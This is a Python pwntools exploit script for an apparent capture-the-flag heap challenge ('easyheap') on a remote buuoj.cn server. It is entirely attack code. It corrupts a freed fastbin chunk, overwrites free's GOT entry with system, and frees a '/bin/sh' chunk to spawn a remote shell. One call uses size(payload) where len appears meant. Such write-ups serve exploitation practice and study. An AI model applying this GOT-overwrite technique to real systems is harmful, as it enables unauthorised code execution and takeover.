from pwn import *
context(log_level='debug')
#io = process("./easyheap")
io = remote("node3.buuoj.cn",26600)
elf = ELF("./easyheap")
def creat_heap(index,size,payload):
	io.recvuntil("Your choice :")
	io.sendline("1")
	io.recvuntil("Size of Heap : ")
	io.sendline(str(size))
	io.recvuntil("Content of heap:")
	io.sendline(payload)

def edit_heap(index,size,payload):
	io.recvuntil("Your choice :")
	io.sendline("2")
	io.recvuntil("Index :")
	io.sendline(str(index))
	io.recvuntil("Size of Heap : ")
	io.sendline(str(size))
	io.recvuntil("Content of heap : ")
	io.sendline(payload)

def delete_heap(index):
	io.recvuntil("Your choice :")
	io.sendline("3")
	io.recvuntil("Index :")
	io.sendline(str(index))
heaparray = 0x6020b0
free_got = elf.got['free']
sys = elf.plt['system']

creat_heap(0,0x68,"a"*10)#idx0
creat_heap(1,0x68,"b"*10)#idx1
creat_heap(2,0x68,"c"*10)#idx2
delete_heap(2)
payload = "/bin/sh\x00" + p64(0)*12 + p64(0x71) +p64(heaparray - 3)
edit_heap(1,size(payload),payload)
payload = "\xaa"*3+p64(0)*4 + p64(free_got)
creat_heap(0,0x68,"aaa")#idx2
creat_heap(0,0x68,'a')#fake_chunk
edit_heap(3,len(payload),payload)
edit_heap(0,len(p64(sys)),p64(sys))
delete_heap(1)
io.interactive()